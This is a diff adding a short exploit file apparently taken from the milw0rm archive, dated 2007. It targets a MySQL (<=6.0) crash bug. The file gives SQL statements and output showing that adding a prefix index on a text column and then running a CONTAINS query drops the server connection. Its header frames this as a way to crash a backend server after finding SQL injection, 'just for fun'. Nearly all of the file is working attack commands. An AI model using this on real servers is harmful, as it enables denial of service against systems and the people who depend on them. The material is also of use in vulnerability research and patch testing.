@@ -1,0 +1,30 @@
+/*
+ * MySQL <=6.0 possibly affected
+ * Kristian Erik Hermansen
+ * Credit: Joe Gallo
+ * You must have ALTER permissions to exploit this bug!
+ * Scenario: You found SQL injection, but you want to punch backend server
+ * in the nuts just for fun.  Start with the ALTER TABLE statement on
+ * a table and field you know to exist.  The first two SQL statements are
+ * simply to demostrate reproducibility...
+ */
+
+<snip>
+mysql> CREATE TABLE `test` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT PRIMARY KEY,
+  `foo` text NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+Query OK, 0 rows affected
+
+mysql> SELECT * FROM test WHERE CONTAINS(foo, 'bar');
+Empty set
+
+mysql> ALTER TABLE test ADD INDEX (foo(100));
+Query OK, 0 rows affected
+Records: 0  Duplicates: 0  Warnings: 0
+
+mysql> SELECT * FROM test WHERE CONTAINS(foo, 'bar');
+ERROR 2013 : Lost connection to MySQL server during query
+</snip>
+
+# milw0rm.com [2007-11-09]
